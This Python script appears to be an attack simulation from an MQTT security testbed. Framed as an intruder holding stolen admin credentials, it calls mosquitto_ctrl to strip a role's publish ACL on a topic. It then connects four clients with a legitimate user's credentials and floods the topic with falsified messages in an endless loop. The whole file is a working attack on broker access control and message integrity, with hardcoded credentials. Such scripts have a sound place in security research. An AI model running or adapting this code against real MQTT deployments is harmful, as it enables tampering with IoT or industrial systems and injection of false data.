import time
import subprocess
import mqtt_utilities as util
import paho.mqtt.client as mqtt
import socket
import sys

# admin credentials, used to change access permission to the topics, we assume that the attacker obtained those using the hacked laptop from one operator of the system
a_username = "myadmin"
a_password = "pass123"
topic = "test/topic1"
username = "client2"
password = "pass2"
local_ip_address = util.get_local_ip()
reconnect_delay = 10
connection1 = util.Connection_status()
connection2 = util.Connection_status()
connection3 = util.Connection_status()
connection4 = util.Connection_status()

# the attacker discovers the role to modify to achieve his goals by accessing the json configuration file of the dynsec plugin
completed_process = subprocess.run(
    f"mosquitto_ctrl -u {a_username} -P {a_password} dynsec removeRoleACL roleClient publishClientSend test/topic1", shell=True, capture_output=True, text=True)

if completed_process.returncode == 0:
    print(completed_process.stdout)
else:
    print(completed_process.stderr)

# the attacker then uses an existing client to connect to the broker and publish wrong messages
while True:
    client1 = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2, userdata=connection1, protocol=mqtt.MQTTv5)
    client2 = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2, userdata=connection2, protocol=mqtt.MQTTv5)
    client3 = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2, userdata=connection3, protocol=mqtt.MQTTv5)
    client4 = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2, userdata=connection4, protocol=mqtt.MQTTv5)
    client1.username_pw_set(username, password)
    client2.username_pw_set(username, password)
    client3.username_pw_set(username, password)
    client4.username_pw_set(username, password)
    client1.on_connect = util.on_connect
    client2.on_connect = util.on_connect
    client3.on_connect = util.on_connect
    client4.on_connect = util.on_connect
    client1.on_disconnect = util.on_disconnect
    client2.on_disconnect = util.on_disconnect
    client3.on_disconnect = util.on_disconnect
    client4.on_disconnect = util.on_disconnect
    client1.on_publish = util.on_publish
    client2.on_publish = util.on_publish
    client3.on_publish = util.on_publish
    client4.on_publish = util.on_publish
    if util.connect_client(client1, connection1, reconnect_delay) and util.connect_client(client2, connection2, reconnect_delay) and util.connect_client(client3, connection3, reconnect_delay) and util.connect_client(client4, connection4, reconnect_delay):
        while True:
            try:
                message1 = f"Modified message at {time.strftime('%Y-%m-%d %H:%M:%S')} from {local_ip_address}"
                message2 = f"Modified message at {time.strftime('%Y-%m-%d %H:%M:%S')} from {local_ip_address}"
                message3 = f"Modified message at {time.strftime('%Y-%m-%d %H:%M:%S')} from {local_ip_address}"
                message4 = f"Modified message at {time.strftime('%Y-%m-%d %H:%M:%S')} from {local_ip_address}"
                client1.publish(topic, message1)
                client2.publish(topic, message2)
                client3.publish(topic, message3)
                client4.publish(topic, message4)
                print(f"Published: {message1}")
                print(f"Published: {message2}")
                print(f"Published: {message3}")
                print(f"Published: {message4}")
                time.sleep(10)
            except socket.error as e:
                print(
                    f"Network error occurred while publishing manipulated messages: {e}", file=sys.stderr)
                client1.disconnect()
                client2.disconnect()
                client3.disconnect()
                client4.disconnect()
                break
            except Exception as e:
                print(
                    f"Unexpected error occurred while publishing manipulated messages: {e}", file=sys.stderr)
                client1.disconnect()
                client2.disconnect()
                client3.disconnect()
                client4.disconnect()
    else:
        print(f"Retrying connection in {reconnect_delay} seconds...")
        time.sleep(reconnect_delay)
